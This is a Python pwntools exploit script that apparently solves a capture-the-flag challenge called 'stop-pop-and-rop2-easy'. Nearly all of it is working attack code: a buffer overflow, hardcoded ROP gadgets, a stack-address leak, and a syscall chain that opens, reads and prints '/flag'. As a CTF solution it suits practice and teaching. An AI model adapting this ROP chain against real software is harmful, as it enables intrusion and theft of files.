#!/usr/bin/env python3

from pwn import *

exe = ELF("./stop-pop-and-rop2-easy")

context.binary = exe

gdb_script = """
b *challenge+269
"""

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdb_script)
    else:
        r = remote("addr", 1337)

    return r

data_section = 0x4040d8
vuln_func = 0x401aff
flag = b'/flag\x00'
ret_gadget = 0x40101a
pop_rdi = 0x401ac0
pop_rax = 0x401ac8
pop_rsi = 0x401ad8
pop_rdx = 0x401ad0
syscall = 0x401af0
offset = 104
main_addr = 0x401c20
def main():
    r = conn()

    # good luck pwning :)

    payload = flat(
        flag,
        cyclic(offset-len(flag)),
        # first we leak a stack address from the data section
        ret_gadget,
        pop_rax, 1,
        pop_rdi, 1,
        pop_rsi, data_section,
        pop_rdx, 100,
        syscall,
        ret_gadget,
        # second we open the file
        p64(exe.symbols['main'])
    )
    r.sendline(payload)
    r.recvuntil(b'Leaving!\n')
    data = u64(r.recv(8))
    
    buff_addr = data - 0x40 + 0x8
    log.info(f"Leaked data: {hex(data)}")
    log.info(f"Buffer address: {hex(buff_addr)}")
    payload2 = flat(
        flag,
        cyclic(offset-len(flag)),
        ret_gadget,
        # first we open the file
        pop_rax, 2,
        pop_rdi, buff_addr,
        pop_rsi, 0,
        pop_rdx, 0,
        syscall,
        # then we read the file
        pop_rax, 0,
        pop_rdi, 3,
        pop_rsi, buff_addr,
        pop_rdx, 100,
        syscall,
        # finally we write to stdout
        pop_rax, 1,
        pop_rdi, 1,
        pop_rsi, buff_addr,
        pop_rdx, 100,
        syscall,
    )
    r.send(payload2)
    r.interactive()


if __name__ == "__main__":
    main()
